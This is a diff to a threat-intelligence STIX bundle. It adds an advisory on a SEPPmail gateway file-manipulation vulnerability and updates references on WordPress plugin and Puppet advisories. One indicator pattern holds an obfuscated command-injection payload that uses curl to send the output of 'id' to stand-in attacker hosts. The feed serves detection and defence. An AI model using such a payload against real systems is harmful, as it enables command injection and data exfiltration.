@@ -1,6 +1,6 @@
 {
   "type": "bundle",
-  "id": "bundle--10d84349-10bd-58d7-8892-b4e11611d2fa",
+  "id": "bundle--b4f5eecf-1fb2-52f2-872e-2fe1b783c95a",
   "objects": [
     {
       "type": "attack-pattern",
@@ -1336,6 +1336,17 @@
       "pattern": "[url:value = 'http://attacker.example/$(curl$IFS-s$IFSsaldirgan.com/$(id|base64))']",
       "pattern_type": "stix",
       "valid_from": "2026-11-02T13:26:29.000Z"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--00188e54-42ee-5f5a-9ae3-5a7dd83e88f7",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-04T12:00:43.000Z",
+      "modified": "2026-11-04T12:00:43.000Z",
+      "relationship_type": "uses",
+      "source_ref": "report--176e601c-1cee-51e6-9693-09e237931035",
+      "target_ref": "attack-pattern--2e4d9280-53f9-5f98-9c79-9970f1080b3d"
     },
     {
       "type": "relationship",
@@ -3378,7 +3389,7 @@
       "id": "relationship--50aad08a-a81a-5262-afab-e57f1cea640b",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-11-04T10:42:27.000Z",
-      "modified": "2026-11-04T10:42:27.000Z",
+      "modified": "2026-11-04T12:01:26.000Z",
       "relationship_type": "uses",
       "source_ref": "report--61753c2e-9616-5b68-8442-02d2461ee3dd",
       "target_ref": "attack-pattern--03c83a54-7fcd-5e1a-99d5-88d0bbd8fb19"
@@ -6862,6 +6873,17 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
+      "id": "relationship--d8283542-cc36-57ad-b46d-3fe104f4342a",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "relationship_type": "has",
+      "source_ref": "software--5e970ae8-13bd-542b-b0fc-1f9e55a0dfd4",
+      "target_ref": "vulnerability--b66e6abc-a257-550e-b984-7ceb79c630eb"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
       "id": "relationship--d8368136-d92f-5b00-8381-ad14a1a98851",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -9175,6 +9197,54 @@
         "status": "unknown"
       },
       "x_craftedsignal_kev_status": "unknown"
+    },
+    {
+      "type": "report",
+      "spec_version": "2.1",
+      "id": "report--176e601c-1cee-51e6-9693-09e237931035",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-04T12:00:43.000Z",
+      "modified": "2026-11-04T12:00:43.000Z",
+      "name": "SEPPmail Secure Email Gateway: Arbitrary file manipulation via Large File Transfer (CVE-2026-114425)",
+      "description": "## Overview\n\nSEPPmail Secure Email Gateway versions before 15.1.1 are susceptible to unauthenticated arbitrary file read, move, or delete attacks. The vulnerability exists within the Large File Transfer (LFT) feature, which incorrectly trusts externally provided file path metadata. Attackers can leverage this to manipulate files processed by the mail-worker, which executes with root privileges. This vulnerability is identified as CVE-2026-114425.\n\n## Impact\n\nSuccessful exploitation allows an unauthenticated remote attacker to read, move, or delete arbitrary files on the system with root-level privileges, potentially leading to full system compromise or information disclosure of sensitive email data.\n\n## Recommendation\n\n- Upgrade SEPPmail Secure Email Gateway to version 15.1.1 or later immediately.\n- If patching is not immediately feasible, disable the Large File Transfer (LFT) feature on internet-facing SEPPmail gateways until the update can be applied.\n- Audit system logs for unexpected file deletions or access attempts targeting critical system configuration files.\n",
+      "published": "2026-11-04T12:00:43.000Z",
+      "object_refs": [
+        "attack-pattern--2e4d9280-53f9-5f98-9c79-9970f1080b3d",
+        "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+        "software--5e970ae8-13bd-542b-b0fc-1f9e55a0dfd4",
+        "vulnerability--b66e6abc-a257-550e-b984-7ceb79c630eb"
+      ],
+      "external_references": [
+        {
+          "source_name": "craftedsignal",
+          "external_id": "brief-2026-11-04-seppmail-file-manipulation",
+          "url": "https://feed.craftedsignal.io/briefs/2026-11-seppmail-file-manipulation/"
+        },
+        {
+          "source_name": "reference",
+          "url": "https://docs.seppmail.com/en/20_revision-history.html"
+        },
+        {
+          "source_name": "reference",
+          "url": "https://sploitus.com/exploit?id=CVE-2026-114425"
+        },
+        {
+          "source_name": "reference",
+          "url": "https://sploitus.com/exploit?id=CVE-2026-114425\u0026utm_source=rss\u0026utm_medium=rss"
+        }
+      ],
+      "confidence": 95,
+      "x_craftedsignal_brief_id": "brief-2026-11-04-seppmail-file-manipulation",
+      "x_craftedsignal_event_id": "brief-2026-11-04-seppmail-file-manipulation",
+      "x_craftedsignal_revision": 1,
+      "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-11-seppmail-file-manipulation/",
+      "x_craftedsignal_activity_at": "2026-11-04T12:00:43.000Z",
+      "x_craftedsignal_severity": "critical",
+      "x_craftedsignal_type": "advisory",
+      "x_craftedsignal_exploitation_evidence": {
+        "status": "unknown"
+      },
+      "x_craftedsignal_kev_status": "false"
     },
     {
       "type": "report",
@@ -13376,7 +13446,7 @@
       "id": "report--61753c2e-9616-5b68-8442-02d2461ee3dd",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-11-04T10:42:27.000Z",
-      "modified": "2026-11-04T10:42:27.000Z",
+      "modified": "2026-11-04T12:01:26.000Z",
       "name": "Import and export users and customers: Privilege escalation in ACUI_Cron (CVE-2026-120554)",
       "description": "## Overview\nThe \"Import and export users and customers\" plugin for WordPress (versions up to and including 2.5.11) contains a privilege escalation vulnerability. The `ACUI_Cron::save_settings()` function improperly persists configuration options (`acui_cron_activated`, `acui_cron_configured_by`, `acui_cron_user_id`, and `acui_cron_path_to_file`) before executing authorization checks. Authenticated users with the `create_users` capability can exploit this race condition to modify administrative settings and escalate their privileges to Administrator during an unattended cron task execution.\n\n## Impact\nAn authenticated attacker with limited capabilities (`create_users`) can gain full administrative access to the WordPress environment by manipulating cron settings, potentially leading to total system compromise.\n\n## Recommendation\n- Inventory WordPress installations running the \"Import and export users and customers\" plugin and verify the version.\n- Update the plugin to the latest version (patch for 2.5.11) as soon as the vendor provides a release.\n- If a patch is unavailable, disable the plugin or restrict access to administrative functions to trusted users only.\n- Audit user roles and capabilities to minimize users with the `create_users` permission.\n",
       "published": "2026-11-04T10:42:27.000Z",
@@ -13400,14 +13470,18 @@
         {
           "source_name": "reference",
           "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-120554"
+        },
+        {
+          "source_name": "reference",
+          "url": "https://sploitus.com/exploit?id=CVE-2026-120554\u0026utm_source=rss\u0026utm_medium=rss"
         }
       ],
       "confidence": 80,
       "x_craftedsignal_brief_id": "brief-2026-11-04-wordpress-acui-privesc",
       "x_craftedsignal_event_id": "brief-2026-11-04-wordpress-acui-privesc",
-      "x_craftedsignal_revision": 1,
+      "x_craftedsignal_revision": 2,
       "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-11-wordpress-acui-privesc/",
-      "x_craftedsignal_activity_at": "2026-11-04T10:42:27.000Z",
+      "x_craftedsignal_activity_at": "2026-11-04T12:01:26.000Z",
       "x_craftedsignal_severity": "high",
       "x_craftedsignal_type": "advisory",
       "x_craftedsignal_exploitation_evidence": {
@@ -15639,7 +15713,7 @@
       "id": "report--81bc289f-7b1a-5b8f-bcd9-06c670bc967f",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-11-04T00:46:57.000Z",
-      "modified": "2026-11-04T00:46:57.000Z",
+      "modified": "2026-11-04T12:01:26.000Z",
       "name": "Puppet: Deserialization of untrusted data in report-processing (CVE-2026-115731)",
       "description": "CVE-2026-115731 involves a deserialization vulnerability in the report-processing code of Puppet, as used by Puppet Server. A client holding a CA-signed agent certificate can execute arbitrary code on the Puppet Server as the service user by submitting a report containing a crafted rich-data type via a PUT request. In environments where the certificate authority autosigns requests without strong verification, an unauthenticated network attacker can obtain a certificate to exploit this vulnerability. A PoC exploit has been published on Sploitus.\n",
       "published": "2026-11-04T00:46:57.000Z",
@@ -15655,7 +15729,27 @@
         },
         {
           "source_name": "reference",
+          "url": "https://access.redhat.com/security/cve/cve-2026-115732"
+        },
+        {
+          "source_name": "reference",
+          "url": "https://github.com/OpenVoxProject/openvox/security/advisories/GHSA-ffr6-rwpm-p5wq"
+        },
+        {
+          "source_name": "reference",
+          "url": "https://github.com/OpenVoxProject/trapperkeeper-authorization/security/advisories/GHSA-q4hm-33rc-572g"
+        },
+        {
+          "source_name": "reference",
+          "url": "https://help.puppet.com/core/current/Content/PuppetCore/server/release_notes.htm"
+        },
+        {
+          "source_name": "reference",
           "url": "https://portal.perforce.com/s/cve/a91Qi000003IaHpIAK/report-deserialization-code-execution"
+        },
+        {
+          "source_name": "reference",
+          "url": "https://pwn.watch/i/puppet-openvox-server-rce-impersonation-cve-2026-115731"
         },
         {
           "source_name": "reference",
@@ -15664,14 +15758,26 @@
         {
           "source_name": "reference",
           "url": "https://sploitus.com/exploit?id=CVE-2026-115731\u0026utm_source=rss\u0026utm_medium=rss"
+        },
+        {
+          "source_name": "reference",
+          "url": "https://voxpupuli.org/blog/2026/11/03/critical-cve-updates/"
+        },
+        {
+          "source_name": "reference",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-115731"
+        },
+        {
+          "source_name": "reference",
+          "url": "https://www.openwall.com/lists/oss-security/2026/11/03/14"
         }
       ],
       "confidence": 80,
       "x_craftedsignal_brief_id": "brief-2026-11-04-cve-2026-115731",
       "x_craftedsignal_event_id": "brief-2026-11-04-cve-2026-115731",
-      "x_craftedsignal_revision": 1,
+      "x_craftedsignal_revision": 2,
       "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-11-cve-2026-115731/",
-      "x_craftedsignal_activity_at": "2026-11-04T00:46:57.000Z",
+      "x_craftedsignal_activity_at": "2026-11-04T12:01:26.000Z",
       "x_craftedsignal_severity": "high",
       "x_craftedsignal_type": "advisory",
       "x_craftedsignal_exploitation_evidence": {
@@ -22335,6 +22441,13 @@
     {
       "type": "software",
       "spec_version": "2.1",
+      "id": "software--5e970ae8-13bd-542b-b0fc-1f9e55a0dfd4",
+      "name": "Secure Email Gateway (\u003c 15.1.1)",
+      "vendor": "SEPPmail"
+    },
+    {
+      "type": "software",
+      "spec_version": "2.1",
       "id": "software--5f397d48-0a27-545a-a25e-24c3f455fd9f",
       "name": "RG-ES205GC (ESW_1.0(1)B1P48)",
       "vendor": "Ruijie"
@@ -27030,6 +27143,22 @@
           "source_name": "cve",
           "external_id": "CVE-2026-117518",
           "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-117518"
+        }
+      ]
+    },
+    {
+      "type": "vulnerability",
+      "spec_version": "2.1",
+      "id": "vulnerability--b66e6abc-a257-550e-b984-7ceb79c630eb",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "name": "CVE-2026-114425",
+      "external_references": [
+        {
+          "source_name": "cve",
+          "external_id": "CVE-2026-114425",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-114425"
         }
       ]
     },
